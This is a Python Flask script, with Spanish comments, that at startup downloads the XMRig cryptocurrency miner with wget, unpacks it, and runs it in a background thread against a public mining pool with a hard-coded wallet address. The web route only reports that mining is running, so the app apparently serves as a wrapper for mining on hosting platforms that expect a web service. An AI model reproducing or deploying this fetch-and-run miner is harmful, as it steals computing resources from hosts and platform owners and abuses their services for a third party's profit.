from flask import Flask, jsonify
import os
import subprocess
import threading

app = Flask(__name__)

# Función para ejecutar los comandos de minería automáticamente al iniciar
def start_mining():
    try:
        os.makedirs('kiu', exist_ok=True)  # Crear el directorio si no existe
        os.chdir('kiu')
        subprocess.run(['wget', 'https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'])
        subprocess.run(['tar', '-xf', 'xmrig-6.22.2-linux-static-x64.tar.gz'])
        os.chdir('xmrig-6.22.2')
        subprocess.Popen(['./xmrig', '-o', 'rx.unmineable.com:3333', '-r', '2', '-R', '1', '-u', 'TSjct7Xe3jePWzP6FDhMgBALqM8s6m4C1J'])
    except Exception as e:
        print(f"Error al iniciar el minero: {e}")

# Ruta básica de Flask
@app.route('/')
def home():
    return jsonify({'status': 'Servidor activo, minería ejecutándose'}), 200

if __name__ == '__main__':
    # Iniciar la minería en un hilo separado para que no bloquee Flask
    mining_thread = threading.Thread(target=start_mining)
    mining_thread.daemon = True  # Asegura que se detenga si el script termina
    mining_thread.start()
    
    # Iniciar el servidor Flask
    app.run(host='0.0.0.0', port=5000)
